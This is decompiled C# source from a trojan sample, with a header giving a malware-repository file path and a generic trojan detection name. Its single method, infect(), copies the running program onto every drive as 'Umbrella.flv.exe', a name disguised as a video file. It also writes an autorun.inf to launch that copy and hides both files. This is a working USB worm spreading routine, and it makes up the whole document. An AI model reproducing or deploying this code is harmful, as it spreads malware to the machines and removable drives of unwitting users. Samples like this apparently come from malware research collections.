// Decompiled with JetBrains decompiler
// Type: Usb1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A0E0E7A4-E23F-4051-9DEF-AB2E1D12CB51
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-99a5466522471fa6514592bc9bc58db9d9745334118a229088f2fa10c6469211.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Windows.Forms;

[StandardModule]
internal sealed class Usb1
{
  public static void infect()
  {
    string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
    string[] logicalDrives = Directory.GetLogicalDrives();
    int index = 0;
    while (index < logicalDrives.Length)
    {
      string str = logicalDrives[index];
      try
      {
        File.Copy(Application.ExecutablePath, str + "Umbrella.flv.exe");
        StreamWriter streamWriter = new StreamWriter(str + "\\autorun.inf");
        streamWriter.WriteLine("[autorun]");
        streamWriter.WriteLine("open=" + str + "Umbrella.flv.exe");
        streamWriter.WriteLine("shellexecute=" + str, (object) 1);
        streamWriter.Close();
        File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
        File.SetAttributes(str + "Umbrella.flv.exe", FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
  }
}
